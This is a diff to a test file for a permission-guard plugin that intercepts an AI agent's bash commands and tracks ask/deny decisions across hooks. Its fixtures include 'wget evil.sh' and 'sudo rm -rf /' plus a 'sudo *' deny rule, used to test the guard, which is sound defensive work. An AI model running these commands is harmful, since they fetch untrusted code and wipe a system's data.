@@ -1,5 +1,6 @@
 import { describe, it, expect, beforeEach } from "vitest";
 import { beforeExecute, handlePermissionAsk, clearStoredDecision, getStoredDecision } from "../enforce.js";
+import { createBashGuardHooks } from "../adapter.js";
 import type { PluginConfig } from "../config.js";
 import type { RestructureConfig } from "../plugin-config.js";
 
@@ -159,13 +160,67 @@ describe("characterization: prompt cardinality per path", () => {
     expect(prompts).toHaveLength(0);
   });
 
-  it("cancellation path: stored decision without permission.ask leaves no residue after clear", () => {
-    beforeExecute("Bash", "card", "/project", { command: "wget evil.sh" }, nativeAskAll, enabled);
-    expect(getStoredDecision("card")).toBeDefined();
-    clearStoredDecision("card");
-    const output = { status: "ask" as const };
-    handlePermissionAsk({ callID: "card" }, output);
-    expect(output.status).toBe("ask");
+  it("decision stored in before is garbage-collected by tool.execute.after when permission.ask never fires", async () => {
+    const hooks = createBashGuardHooks({ directory: "/project" });
+    await hooks.config!({ permission: { bash: { "*": "ask" } } } as any);
+    await hooks["tool.execute.before"]!({ tool: "Bash", callID: "lifecycle-1", sessionID: "s" }, { args: { command: "wget evil.sh" } });
+    expect(getStoredDecision("lifecycle-1")).toBeDefined();
+
+    await hooks["tool.execute.after"]!({ tool: "Bash", callID: "lifecycle-1", sessionID: "s", args: {} }, { title: "", output: "", metadata: {} });
+    expect(getStoredDecision("lifecycle-1")).toBeUndefined();
+  });
+
+  it("full sequence: before → permission.ask consumes → after is a safe no-op", async () => {
+    const hooks = createBashGuardHooks({ directory: "/project" });
+    await hooks.config!({ permission: { bash: { "*": "ask" } } } as any);
+    await hooks["tool.execute.before"]!({ tool: "Bash", callID: "lifecycle-2", sessionID: "s" }, { args: { command: "wget evil.sh" } });
+
+    const permOutput = { status: "ask" as const };
+    await hooks["permission.ask"]!({ callID: "lifecycle-2" } as any, permOutput);
+    expect(permOutput.status).toBe("ask");
+    expect(getStoredDecision("lifecycle-2")).toBeUndefined();
+
+    await hooks["tool.execute.after"]!({ tool: "Bash", callID: "lifecycle-2", sessionID: "s", args: {} }, { title: "", output: "", metadata: {} });
+    expect(getStoredDecision("lifecycle-2")).toBeUndefined();
+  });
+
+  it("deny decision: ask consumes it; after never sees residue", async () => {
+    const hooks = createBashGuardHooks({ directory: "/project" });
+    await hooks.config!({ permission: { bash: { "*": "ask", "sudo *": "deny" } } } as any);
+    await hooks["tool.execute.before"]!({ tool: "Bash", callID: "lifecycle-3", sessionID: "s" }, { args: { command: "sudo rm -rf /" } });
+
+    const permOutput = { status: "ask" as const };
+    await hooks["permission.ask"]!({ callID: "lifecycle-3" } as any, permOutput);
+    expect(permOutput.status).toBe("deny");
+    expect(getStoredDecision("lifecycle-3")).toBeUndefined();
+  });
+
+  it("non-bash tools store nothing; after is a no-op", async () => {
+    const hooks = createBashGuardHooks({ directory: "/project" });
+    await hooks.config!({ permission: { bash: { "*": "ask" } } } as any);
+    await hooks["tool.execute.before"]!({ tool: "Edit", callID: "lifecycle-4", sessionID: "s" }, { args: {} });
+    expect(getStoredDecision("lifecycle-4")).toBeUndefined();
+    await hooks["tool.execute.after"]!({ tool: "Edit", callID: "lifecycle-4", sessionID: "s", args: {} }, { title: "", output: "", metadata: {} });
+    expect(getStoredDecision("lifecycle-4")).toBeUndefined();
+  });
+
+  it("disabled plugin: before and after are no-ops", async () => {
+    const hooks = createBashGuardHooks({ directory: "/project" });
+    await hooks.config!({ permission: { bash: "allow" } } as any);
+    await hooks["tool.execute.before"]!({ tool: "Bash", callID: "lifecycle-5", sessionID: "s" }, { args: { command: "wget evil.sh" } });
+    expect(getStoredDecision("lifecycle-5")).toBeUndefined();
+    await hooks["tool.execute.after"]!({ tool: "Bash", callID: "lifecycle-5", sessionID: "s", args: {} }, { title: "", output: "", metadata: {} });
+    expect(getStoredDecision("lifecycle-5")).toBeUndefined();
+  });
+
+  it("reused callID: the fresh decision overwrites any stale residue", async () => {
+    const hooks = createBashGuardHooks({ directory: "/project" });
+    await hooks.config!({ permission: { bash: { "*": "ask", "sudo *": "deny" } } } as any);
+    await hooks["tool.execute.before"]!({ tool: "Bash", callID: "lifecycle-6", sessionID: "s" }, { args: { command: "wget evil.sh" } });
+    expect(getStoredDecision("lifecycle-6")?.action).toBe("ask");
+
+    await hooks["tool.execute.before"]!({ tool: "Bash", callID: "lifecycle-6", sessionID: "s" }, { args: { command: "sudo rm -rf /" } });
+    expect(getStoredDecision("lifecycle-6")?.action).toBe("deny");
   });
 });
 
